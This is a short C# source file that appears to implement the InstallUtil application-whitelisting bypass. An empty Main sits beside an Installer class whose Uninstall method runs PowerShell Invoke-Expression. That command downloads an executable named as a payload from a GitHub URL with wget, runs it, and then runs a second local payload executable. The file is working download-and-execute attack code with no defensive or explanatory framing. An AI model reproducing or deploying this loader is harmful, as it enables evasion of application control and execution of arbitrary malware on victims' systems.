using System;
using System.Management.Automation;
// edit the .csproj to add this reference.
namespace Whitelist
{
    class Program
    {
        static void Main(string[] args)
        {
        }
    }
}
[System.ComponentModel.RunInstaller(true)]
// Install need be added in reference, just put "install" in search box.
public class Sample : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        PowerShell ps = PowerShell.Create();
        ps.AddCommand("Invoke-Expression");
        ps.AddArgument("$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp4InstallUntil/Csharp4InstallUntilOnlinePayload.exe';$output = 'Csharp4InstallUntilOnlinePayloadDownloaded.exe';wget $url -outfile $output;./Csharp4InstallUntilOnlinePayloadDownloaded.exe;./Csharp4InstallUntilOfflinePayload.exe;");
        ps.Invoke();
    }
}